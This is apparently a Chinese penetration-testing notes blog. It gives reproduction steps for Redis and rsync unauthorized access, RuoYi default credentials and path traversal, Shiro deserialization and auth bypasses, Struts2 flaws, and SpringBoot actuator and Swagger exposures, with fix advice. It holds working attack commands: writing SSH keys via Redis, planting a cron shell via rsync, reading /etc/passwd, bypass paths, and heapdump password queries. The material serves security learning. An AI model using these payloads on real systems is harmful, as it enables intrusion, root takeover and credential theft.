<h2 id="环境搭建：">1.2. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者 Kali 192.168.179.129 </span><br><span class="line">靶机 ubuntu 192.168.179.130 -- 需安装 redis 环境</span><br><span class="line"></span><br><span class="line">		靶机部署：</span><br><span class="line">		wget http://download.redis.io/releases/redis-3.2.11.tar.gz	// 下载redis安装包</span><br><span class="line">		tar zxvf redis-3.2.11.tar.gz // 解压</span><br><span class="line">		cd redis-3.2.11</span><br><span class="line">		make // 进入解压目录后make执行</span><br><span class="line">		cd src</span><br><span class="line">		sudo cp redis-server /usr/bin </span><br><span class="line">		sudo cp redis-cli /usr/bin // 配置环境变量</span><br><span class="line">		cd ..</span><br><span class="line">		sudo cp redis.conf /etc // 将 redis.conf 复制到 etc 目录下</span><br><span class="line">		vim /etc/redis.conf</span><br><span class="line">			Protected-mode yes 改为 no</span><br><span class="line">			bind 127.0.0.1 之前加上#</span><br><span class="line">		redis-server /etc/redis.conf // 开启 redis 服务</span><br><span class="line">		</span><br><span class="line">		sudo apt install openssh-server // 安装 ssh 服务</span><br><span class="line">		systemctl start sshd</span><br></pre></td></tr></table></figure>

<h2 id="复现过程：">1.3. 复现过程：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.179.130 [-p可指定端口，省略为默认6379]</span><br><span class="line">ping // 若返回 PONG 则表示漏洞存在</span><br><span class="line"></span><br><span class="line">若提示 Redis(error)NOAUTH Authentication required 表示需要身份认证 auth 加密码进行尝试</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用：">1.4. 漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">写入ssh公钥，获得操作系统权限：</span><br><span class="line">	条件1 : 对方需要开启 ssh 服务</span><br><span class="line">	条件2 : redis 以 root 身份运行</span><br><span class="line"></span><br><span class="line">攻击者</span><br><span class="line">ssh-keygen -t rsa // 本地生成 ssh 密钥</span><br><span class="line">进入 .ssh 目录（上面生成密钥的时候会显示路径）</span><br><span class="line">echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot; &gt; key.txt // 将公钥写入 key.txt</span><br><span class="line">cat key.txt | redis-cli -h 192.168.179.130 -x set crack // 将公钥 key.txt 写入目标 redis</span><br><span class="line">config get dir // 获取靶机服务器 redis 备份路径</span><br><span class="line">config set dir /root/.ssh // 更改 redis 备份路径为 ssh 公钥存放目录，结果返回 OK 代表执行成功</span><br><span class="line">config get dbfilename // 获取当前备份文件名称</span><br><span class="line">config set dbfilename authorized_keys // 更改备份文件名称为 authorized_keys</span><br><span class="line">config get dbfilename // 确认是否修改成功</span><br><span class="line">save // 保存</span><br><span class="line">ssh -i id_rsa root@192.168.179.130 // 利用公钥登录 ssh 服务器，得在 .ssh 目录下执行</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/05/RZ7cfigbVX1sp3y.png" alt="redis.png"></p>
<h2 id="漏洞修复：">1.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、登录账户设置复杂的口令；</span><br><span class="line">2、禁止公钥登陆系统；</span><br><span class="line">3、禁止redis服务对外开放</span><br><span class="line">4、设置IP白名单</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Rsync</title>
    <url>/pages/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Rsync.html</url>
    <content><![CDATA[<h1 id="rsync未授权访问">1. rsync未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync 是 linux 系统下的数据镜像备份工具，使用 rsync 可以快速增量备份数据，支持本地复制，或与其他ssh、rsync 主机同步。该协议默认监听873端口，如果目标开启 rsync，并且没有配置 ACL 或访问密码，就可以未授权读写目标服务器文件。</span><br></pre></td></tr></table></figure>

<p>More info : 该服务默认开放端口873</p>
<h2 id="环境搭建：">1.2. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者 Kali 192.168.179.129 </span><br><span class="line">靶机 ubuntu 192.168.179.130 -- 需安装 rsync 环境</span><br><span class="line"></span><br><span class="line">		靶机部署：</span><br><span class="line">		wget https://download.samba.org/pub/rsync/src/rsync-3.0.6.tar.gz // 下载</span><br><span class="line">		tar -zxvf rsync-3.0.6.tar.gz // 解压</span><br><span class="line">		cd rsync-3.0.6 </span><br><span class="line">		./configure --prefix=/usr/local/rsync // 配置环境</span><br><span class="line">		make </span><br><span class="line">		make install </span><br><span class="line">		vim /etc/rsyncd.conf // 创建并编辑 rsyncd.conf 文件内容如下</span><br><span class="line">		</span><br><span class="line">port=873              #端口 根据服务器策略调整</span><br><span class="line">uid = root  </span><br><span class="line">gid = root</span><br><span class="line">use chroot = no</span><br><span class="line">max connections = 4    #连接数</span><br><span class="line">pid file = /usr/local/rsync/rsyncd.pid</span><br><span class="line">lock file = /usr/local/rsync/rsync.lock</span><br><span class="line">log file = /usr/local/rsync/rsyncd.log</span><br><span class="line">[down]          #连接后显示的初始目录名称       </span><br><span class="line">path = /		#这是文件的位置 可以设置多个</span><br><span class="line">auth user = root     </span><br><span class="line">uid = root              </span><br><span class="line">gid = root</span><br><span class="line">read only = no</span><br><span class="line">secrets file = /etc/rsyncd.secrets #配置连接的密码 格式为 username:password</span><br><span class="line"></span><br><span class="line">		vim /etc/rsyncd.secrets // 创建并编辑 rsyncd.secrets 文件内容如下</span><br><span class="line"></span><br><span class="line">qwtd:123456</span><br></pre></td></tr></table></figure>

<h2 id="复现过程：">1.3. 复现过程：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync rsync://192.168.179.130 // 连接 rsync 服务器</span><br><span class="line">如下图所示，连接后会回显目录</span><br><span class="line">rsync rsync://192.168.179.130/down // 可以查看该服务器下的文件，目录内容根据环境搭建时的 path 值决定</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/05/Pb74JwLrMhZ6dBK.png"></p>
<h2 id="漏洞利用：">1.4. 漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync -av rsync://192.168.179/etc/qiwentaidi/.config // 下载文件</span><br><span class="line">rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell // 上传文件</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/05/TfuKEHPMNOB7ktv.png" alt="image-20220705132612060"></p>
<h2 id="漏洞修复：">1.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">更改rysnc默认配置文件/etc/rsyncd.conf，添加或修改参数：</span><br><span class="line">1、访问控制：设置host allow，限制允许访问主机的IP。</span><br><span class="line">2、权限控制：设置read only，将模块设置成只读。</span><br><span class="line">3、访问认证：设置auth、secrets，认证成功才能调用服务。</span><br><span class="line">4、模块隐藏：设置list，将模块隐藏。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>RuoYi</title>
    <url>/pages/CMS/RuoYi.html</url>
    <content><![CDATA[<h3 id="RuoYi后台默认口令-任意文件读取">0.0.1. RuoYi后台默认口令+任意文件读取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有些情况访问若依后台时网页会已输入账号密码，通常情况为默认口令保存</span><br><span class="line">默认口令 admin/admin123</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/06/hYU6e14y8XOSlus.png"></p>
<h4 id="漏洞利用：">0.0.1.1. 漏洞利用：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录到后台时可以尝试读取下面文件，不一定成功</span><br><span class="line">/common/download/resource?resource=/profile/../../../../etc/passwd // 读取passwd文件</span><br></pre></td></tr></table></figure>

<h3 id="Shiro反序列化">0.0.2. Shiro反序列化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若依后台管理系统基于SpringBoot的权限管理系统 易读易懂、界面简洁美观。 核心技术采用Spring、MyBatis、Shiro。所以也可能存在Shiro反序列化</span><br><span class="line">可到iframe分类shiro中查看文章</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CMS</category>
      </categories>
  </entry>
  <entry>
    <title>Spatial Search Engine</title>
    <url>/pages/MyTools/SSE.html</url>
    <content><![CDATA[<h1 id="Spatial-Search-Engine">1. Spatial Search Engine</h1><p>Spatial Search Engine 目前支持 FOFA 和 Hunter 的查询</p>
<h2 id="功能提醒">1.1. 功能提醒</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">右下角左右箭头只支持中间页码加减功能，翻页后需要点击查询</span><br><span class="line"></span><br><span class="line">Hunter 查询后右上角会显示当前剩余积分，积分=每日免费积分+权益积分</span><br><span class="line"></span><br><span class="line">FOFA 查询后左上角会显示当前用户等级，右下角会显示查询数量</span><br><span class="line">由于考虑到大家应该都买不起企业会员(3w一个月)，这里就不提供蜜罐排查，FID字段结果查询功能等</span><br></pre></td></tr></table></figure>

<h2 id="查询结果">1.2. 查询结果</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172354064.png" alt="image-20230111172354064"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172407313.png" alt="image-20230111172407313"></p>
<h2 id="语法查询">1.3. 语法查询</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172430226.png" alt="image-20230111172430226"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172437462.png" alt="image-20230111172437462"></p>
<h2 id="结果导出">1.4. 结果导出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">点击数据导出按钮，会在当前对应的result目录下生成assets_当前时间戳.csv文件</span><br></pre></td></tr></table></figure>

<h2 id="配置文件">1.5. 配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动工具会在当前目录下生成 config.yaml 文件，可以在界面中更改也可以在 config.yaml 中更改，API表示网址（末尾不加/）防止如 fofa变更网址的情况</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172539039.png" alt="image-20230111172539039"></p>
<h2 id="打包">1.6. 打包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows 打包命令</span><br><span class="line">go build -ldflags -H=windowsgui main.go </span><br></pre></td></tr></table></figure>

<h2 id="下载">1.7. 下载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Github 项目地址 --&gt; https://github.com/qiwentaidi/Spatial-Search-Engine</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>MyTools</category>
      </categories>
  </entry>
  <entry>
    <title>Shiro</title>
    <url>/pages/WEB%E6%A1%86%E6%9E%B6/Shiro.html</url>
    <content><![CDATA[<h1 id="shiro反序列化">1. shiro反序列化</h1><p>More info : 抓包查看请求包的cookie字段中是否包含remeberMe字段，存在则代表该网页使用的是shiro框架</p>
<h2 id="shiro-550">1.1. shiro-550</h2><h3 id="漏洞原理：">1.1.1. 漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</span><br></pre></td></tr></table></figure>

<h3 id="影响版本：">1.1.2. 影响版本：</h3><p><code>Apache Shiro &lt; 1.2.4</code></p>
<h3 id="环境搭建：">1.1.3. 环境搭建：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者:kali 192.168.179.129</span><br><span class="line">靶机:ubuntu 192.168.179.130 -- 需要安装vulhub</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		下载安装vulhub，不会安装可以看unauth中的hadoop那篇文章</span><br><span class="line">		cd vulhub/shiro/CVE-2016-4437/</span><br><span class="line">		sudo docker-compose up -d // 启动环境</span><br><span class="line">		访问靶机8080端口页面如下即部署完成</span><br><span class="line">		sudo docker-compose down // 做完关闭靶机环境</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/07/HLhufiWJybSI9T8.png" alt="image-20220707093716391"></p>
<h3 id="漏洞复现：">1.1.4. 漏洞复现：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里使用到了shiro_rce检测工具和railgun利用工具</span><br><span class="line">先使用shiro_rce工具检测key值</span><br><span class="line">再使用railgun工具进行命令执行</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/07/SQer1iDbEFmlNaA.png" alt="image-20220707112306178"></p>
<p><img src="https://s2.loli.net/2022/07/07/F973B5D2tySpfXl.png" alt="image-20220707112355992"></p>
<hr>
<h2 id="shiro-721">1.2. shiro-721</h2><h3 id="漏洞原理：-1">1.2.1. 漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</span><br></pre></td></tr></table></figure>

<h3 id="影响版本：-1">1.2.2. 影响版本：</h3><p><code>Apache Shiro &lt; 1.4.2</code></p>
<h3 id="漏洞利用：">1.2.3. 漏洞利用：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件:</span><br><span class="line">1. 登录目标网站，获取登录后的Cookie，因为需要有效cookie，且必须存在remember字段</span><br><span class="line">复现方法：</span><br><span class="line">使用railgun工具</span><br><span class="line">1. 将cookie完整的复制到cookie栏</span><br><span class="line">2. 选择yso gadget，并在命令栏写入对应命令</span><br><span class="line">3. 点击获取信息，即可根据gadget和cmd开始伪造cookie，最终会返回一个伪造后的cookie，使用该cookie发包请求即可造成反序列化攻击</span><br></pre></td></tr></table></figure>

<h1 id="CVE-2020-1957-身份认证绕过">2. CVE-2020-1957(身份认证绕过)</h1><h2 id="漏洞原理：-2">2.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们请求的URL在整个项目的传入传递过程。在使用了shiro的项目中，是我们请求的URL(URL1),进过shiro权限检验(URL2), 最后到springboot项目找到路由来处理(URL3)</span><br><span class="line">漏洞的出现就在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL</span><br></pre></td></tr></table></figure>

<h2 id="影响版本：-2">2.2. 影响版本：</h2><p><code>Apache Shiro &lt; 1.5.3</code></p>
<h2 id="环境搭建：-1">2.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机:ubuntu 192.168.179.130</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">			cd vulhub/shiro/CVE-2020-1957/</span><br><span class="line">			sudo docker-compose up -d // 启动环境</span><br><span class="line">			访问到靶机8080端口，显示下图页面即部署成功</span><br><span class="line">			sudo docker-compose down // 做完关闭靶机环境</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/07/trdvbyQq24RmnFx.png" alt="image-20220707124311092"></p>
<h2 id="漏洞复现：-1">2.4. 漏洞复现：</h2><p><code>正常情况访问点login登录是需要密码的，访问admin页面会重定向回登录页面</code></p>
<p><img src="https://s2.loli.net/2022/07/07/HFuGYQUgpJ6hKyk.png" alt="image-20220707125124117"></p>
<p><code>访问该目录/xxx/..;/admin/即可绕过登录验证</code></p>
<p><img src="https://s2.loli.net/2022/07/07/e2hFoWxw3Il6VcX.png" alt="image-20220707124942061"></p>
<h1 id="CVE-2020-11989-身份认证绕过">3. CVE-2020-11989(身份认证绕过)</h1><h2 id="漏洞描述：">3.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者可以通过/;/拼接后台地址或已知接口达到绕过身份验证的效果访问接口的效果。</span><br></pre></td></tr></table></figure>

<h2 id="测试过程：">3.2. 测试过程：</h2><p>某次gov渗透测试时发现了shiro框架，测试之后发现并没有反序列化漏洞，JS中暴露的API接口也并不能访问，于是乎尝试使用身份认证绕过漏洞进行测试（因为shiro存在很多身份认证绕过漏洞）。</p>
<ol>
<li><p>首先访问任意目录，都会重定向回登录主页，使用<code>/;/111</code>进行测试发现返回404（表示客户端已经去访问这个文件，并且绕过了身份验证）。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101041742.png" alt="image-20230416101041742"></p>
</li>
<li><p>通过<code>/;/</code>对之前收集API接口进行访问测试，果然是能够访问到的。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101522105.png" alt="image-20230416101522105"></p>
</li>
<li><p>之前收集的一个upload上传接口，构造数据包尝试一下，上传成功了。</p>
<p>这里开发忘记给&#x2F;files和文件名直接加&#x2F;了，导致我一直没访问到这个文件。后续测试另一个同样的站点的时候才发现，访问到文件的时候发现目录没有执行权限，是直接下载的。</p>
</li>
</ol>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101711015.png" alt="image-20230416101711015"></p>
<h1 id="CVE-2022-32532-身份认证绕过">4. CVE-2022-32532(身份认证绕过)</h1><h2 id="风险描述">4.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当 Apache Shiro 中使用 RegexRequestMatcher 进行权限配置，且正则表达式中携带“.”时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本">4.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro &lt; 1.9.1</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现">4.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过%0a,%0b绕过验证</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB框架</category>
      </categories>
  </entry>
  <entry>
    <title>Struts2</title>
    <url>/pages/WEB%E6%A1%86%E6%9E%B6/Struts2.html</url>
    <content><![CDATA[<h1 id="s2-005">1. s2-005</h1><h4 id="漏洞原理">1.0.0.1. 漏洞原理:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Struts2 标签中 &#x27;&lt;s:a&gt;&#x27; 和 &#x27;&lt;s:url&gt;&#x27; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</span><br><span class="line"></span><br><span class="line">1. none - 链接不包含请求的任意参数值（默认）</span><br><span class="line">2. get - 链接只包含 GET 请求中的参数和其值</span><br><span class="line">3. all - 链接包含 GET 和 POST 所有参数和其值</span><br><span class="line"></span><br><span class="line">&#x27;&lt;s:a&gt;&#x27;用来显示一个超链接，当&#x27;includeParams=all&#x27;的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</span><br></pre></td></tr></table></figure>

<h1 id="s2-007">2. s2-007</h1><h1 id="s2-008">3. s2-008</h1><h1 id="s2-009">4. s2-009</h1><h1 id="s2-012">5. s2-012</h1><h1 id="s2-013">6. s2-013</h1><h1 id="s2-015">7. s2-015</h1><h1 id="s2-016">8. s2-016</h1><h2 id="漏洞原理-1">8.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、&quot;redirect:&quot;、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</span><br></pre></td></tr></table></figure>

<h1 id="s2-045">9. s2-045</h1><h2 id="漏洞原理-2">9.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Struts使用的Jakarta解析文件上传请求包不当，当远程攻击者构造恶意的Content-Type，可能导致远程命令执行。</span><br><span class="line">实际上在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell（另外原本其实也有第三种选择cos）。其中的jakarta解析器是Struts 2框架的标准组成部分。默认情况下jakarta是启用的，所以该漏洞的严重性需要得到正视。</span><br></pre></td></tr></table></figure>

<h1 id="s2-046">10. s2-046</h1><h2 id="漏洞原理-3">10.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用恶意的Content-Disposition值或者使用不合适的Content-Length头就可能导致远程命令执行。该漏洞与S2-045 (CVE-2017-5638)相似，但使用了不同的攻击向量。</span><br><span class="line"></span><br><span class="line">JakartaStreamMultipartRequest已开启。也就是说，Struts2需要通过Jakarta stream parser配置（非默认）。在Struts2配置文件中检查&lt;constant name=”struts.multipart.parser” value=”jakarta-stream” /&gt;</span><br><span class="line">上传的文件大小根据Content-Length头的声明要大于Struts2默认允许的2GB大小</span><br><span class="line">文件名中包含OGNL payload</span><br></pre></td></tr></table></figure>

<h1 id="s2-052">11. s2-052</h1><h2 id="漏洞原理-4">11.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache 官方发布 Struts 2 紧急漏洞公告（S2-052），CVE 编号CVE-2017-9805。公告中披露，Struts2 REST插件的XStream组件存在反序列化漏洞，导致远程代码执行。攻击者利用此漏洞可执行任意代码，创建/删除系统账号，修改任意文件，植入后门等</span><br></pre></td></tr></table></figure>

<h1 id="s2-053">12. s2-053</h1><h1 id="s2-057">13. s2-057</h1><h1 id="s2-059">14. s2-059</h1><h1 id="s2-061">15. s2-061</h1>]]></content>
      <categories>
        <category>WEB框架</category>
      </categories>
  </entry>
  <entry>
    <title>SpringBoot</title>
    <url>/pages/WEB%E6%A1%86%E6%9E%B6/SpringBoot.html</url>
    <content><![CDATA[<h1 id="druid未授权访问">1. druid未授权访问</h1><h2 id="漏洞描述：">1.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Druid由阿里巴巴数据库出品，为监控而生的数据库连接池，并且Druid可以提供监控，监控SQL的执行时间、监控Web URI的请求、Session监控等功能，使用广泛。Druid本身是不存在漏洞的，Druid未授权访问是因为开发者配置的不够全面，导致攻击者输入ip/druid/index.html即可直接即可登录到Druid监控界面。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞危害：">1.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者可以通过/druid/websession.html泄露的Session登录后台，或者对URI监控中的接口进行访问测试，</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现：">1.3. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/druid/index.html</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415221133579.png" alt="image-20230415221133579"></p>
<h2 id="漏洞利用：">1.4. 漏洞利用：</h2><ol>
<li><p>通过URI测试接口</p>
<p>通过拼接URI进行API接口测试，这个看运气，看接口是否存在未授权，是否存在参数缺失提示等等…，下面测试图访问接口的时候会提示什么参数缺失，所以测到了SQL注入。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415222426755.png" alt="image-20230415222426755"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415222655928.png" alt="image-20230415222655928"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415222811864.png" alt="image-20230415222811864"></p>
</li>
<li><p>通过Seesion登录后台</p>
</li>
</ol>
<h2 id="漏洞修复：">1.5. 漏洞修复：</h2><ol>
<li>添加登录用户名密码</li>
<li>禁用druid监控页面</li>
</ol>
<h1 id="SpringBoot未授权访问">2. SpringBoot未授权访问</h1><h2 id="漏洞描述：-1">2.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞危害：-1">2.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">认证模式可绕过，不登录即可通过 URL 或其他方式访问登陆后页面。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现：-1">2.3. 漏洞复现：</h2><p>一般dirsearch都能扫到，前提是路径得对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/actuator</span><br><span class="line">/actuator/env</span><br><span class="line">/actuator/heapdump</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415223427505.png" alt="image-20230415223427505"></p>
<h2 id="漏洞利用：-1">2.4. 漏洞利用：</h2><h3 id="通过heapdump-tools读取内存">2.4.1. 通过heapdump_tools读取内存</h3><p><a href="https://github.com/wyzxxz/heapdump_tool">heapdump_tools</a>,下载链接在超链接文档内。</p>
<p>可以通过读取内存，获取到一些敏感信息，例如内网的数据库连接密码，nacos配置密码，oss等accesskey等等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar heapdump_tools .\heapdump</span><br><span class="line"></span><br><span class="line">[-] Start jhat, waiting...</span><br><span class="line">[-] fing object count: 100000</span><br><span class="line">[-] too many object,please input 0/1 to choose mode.</span><br><span class="line">0. (search data, may can&#x27;t find some data, can&#x27;t use function num=,len=).</span><br><span class="line">1. (load all object, need wait a few minutes).</span><br><span class="line">&gt; 0             // 这里选择0，通过关键字搜索内存信息。</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415224802207.png" alt="image-20230415224802207"></p>
<h3 id="通过MAT读取内存">2.4.2. 通过MAT读取内存</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、下载到heapdump文件</span><br><span class="line">2、使用 MAT 获得 jvm heap 中的密码明文</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line">或</span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905124719657.png" alt="image-20220905124719657"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905124855386.png" alt="image-20220905124855386"></p>
<h2 id="漏洞修复：-1">2.5. 漏洞修复：</h2><ol>
<li>禁止在代码中存储可返回的敏感数据、删除代码中的敏感信息</li>
<li>禁止在web上存放可访问的敏感文件、删除web中的敏感文件</li>
</ol>
<h1 id="Swagger-UI-未授权访问">3. Swagger-UI 未授权访问</h1><h2 id="漏洞描述：-2">3.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务，JAVA在金融机构开发语言的地位一直居高不下，而作为JAVA届服务端的大一统框架Spring，便将Swagger规范纳入自身的标准，建立了Spring-swagger项目，所以在实际测试环境中，基于spring框架的swagger-ui接口展示及调试文档页面最为常见。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞危害：-2">3.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过翻查文档，得到api接口，点击parameters，即可得到该api接口的详细参数。直接构造参数发包，通过回显可以得到大量的用户信息，包含了手机号，邮箱等。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现：-2">3.3. 漏洞复现：</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105133075.png" alt="image-20230416105133075"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105231895.png" alt="image-20230416105231895"></p>
<h2 id="漏洞利用：-2">3.4. 漏洞利用：</h2><p>Postman+Burp实现接口自动测试。<a href="https://blog.csdn.net/qq_44159028/article/details/127878364">教学链接</a></p>
<ol>
<li><p>点击Import，输入api-docs链接，导入API。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105423439.png" alt="image-20230416105423439"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105522038.png" alt="image-20230416105522038"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105722559.png" alt="image-20230416105722559"></p>
</li>
<li><p>设置Environments，**此处Variable一定要设置成baseUrl(区分大小写，不然识别不到)**，后面两个参数设置成需要拼接API的路径，然后点击右上角Save保存。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110214661.png" alt="image-20230416110214661"></p>
</li>
<li><p>回到APIs选择指定的Environments，点击baseUrl可以查看是否配置成功，然后随便点个接口Send测试一下请求是否正常。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110443022.png" alt="image-20230416110443022"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110529154.png" alt="image-20230416110529154"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110715708.png" alt="image-20230416110715708"></p>
</li>
